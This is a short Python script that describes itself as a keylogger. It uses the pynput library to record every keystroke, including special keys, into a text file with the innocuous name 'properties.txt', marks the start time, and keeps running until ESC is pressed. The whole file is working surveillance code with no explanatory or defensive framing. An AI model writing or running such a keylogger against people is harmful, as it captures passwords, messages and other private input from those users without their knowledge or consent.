import os
import datetime
from pynput import keyboard

# Define the log file path in the current working directory
log_file_path = os.path.join(os.getcwd(), "properties.txt")

def write_datetime_to_file():
    """Write the current date and time to the log file."""
    with open(log_file_path, "a") as f:
        current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write("\n")
        f.write(current_datetime)
        f.write("\n")

def on_press(key):
    """Handle key press events."""
    try:
        with open(log_file_path, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                if key.char == '\r':  # Handle Enter key
                    f.write('\n')
                else:
                    f.write(f"{key.char}")
            else:
                # Handle special keys
                if key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.enter:
                    f.write('\n')
                else:
                    f.write(f"[{key}]")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_release(key):
    """Handle key release events."""
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    """Main loop for the keylogger."""
    # Write the current date and time when the program starts
    write_datetime_to_file()

    # Set up the keylogger
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # This will keep the program running until ESC is pressed

if __name__ == "__main__":
    main()
